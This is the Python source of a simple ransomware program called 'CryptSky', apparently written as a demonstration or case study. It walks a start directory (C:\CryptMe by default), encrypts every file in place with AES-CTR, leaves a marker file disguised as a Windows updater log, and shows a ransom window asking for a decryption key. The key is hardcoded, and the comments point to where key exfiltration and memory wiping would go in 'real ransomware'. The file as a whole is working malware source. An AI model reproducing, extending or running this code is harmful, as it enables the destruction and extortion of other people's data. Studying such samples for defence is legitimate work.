#!/usr/bin/env python
from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import argparse
import os
import discover
import modify
import tkinter

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = 'yellow submarine'
START_DIR = ['C:\\CryptMe']


def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser


def decrypt(key):
    if check_key(key):
        try:
            os.remove(r'C:\Windows\Temp\winUpdater.log')
        except FileNotFoundError:
            pass

        ctr = Counter.new(128)
        crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
        startdirs = START_DIR
        for currentDir in startdirs:
            for file in discover.discoverFiles(currentDir):
                modify.modify_file_inplace(file, crypt.encrypt)
        exit()
    else:
        pass



def check_key(key):
    if key == HARDCODED_KEY:
        print("Key Match")
        return True
    else:
        print("Key no match")
        return False


def post_encrypt():

    print("In Post")
    root = tkinter.Tk()
    frame = tkinter.Frame(root)
    frame.grid()
    frame.pack()
    oops = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯", font=('Helvetica', 20))
    oops.pack()
    label = tkinter.Label(frame, text="Enter the decryption key below", font=('Helvetica', 20))
    label.pack()
    e = tkinter.Entry(frame, width=20, font=('Helvetica', 20))
    e.pack()

    def callback():
        decrypt(e.get())

    button = tkinter.Button(frame, text="Decrypt", font=('Helvetica', 20), width=10, command=callback)
    button.pack()
    root.mainloop()
    pass


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        try:
            os.remove(r'C:\Windows\Temp\winUpdater.log')
        except FileNotFoundError:
            pass
        key = input('Enter Your Key> ')

    else:
        try:
            file = open(r'C:\Windows\Temp\winUpdater.log', 'r')
            file.close()
            print("Already Encrypted :)")
            # If this file exists, the system is already encrypted
            post_encrypt()
            exit()
        except FileNotFoundError:
            # If this file does not exist, the system has not been encrypted yet... create the file
            file = open(r'C:\Windows\Temp\winUpdater.log', 'w+')
            file.write("CryptSky Malware has been run on this machine -- JBOOZ :)")
            file.close()

        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        # maybe I'll do that later. but for now, this will do.
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = START_DIR

    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            # os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    ''' # Taken out for Case Studies
    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        key = random(32)
        pass
    '''

    if not decrypt:
        # post encrypt stuff
        # desktop picture
        # icon, etc
        post_encrypt()


if __name__=="__main__":
    main()
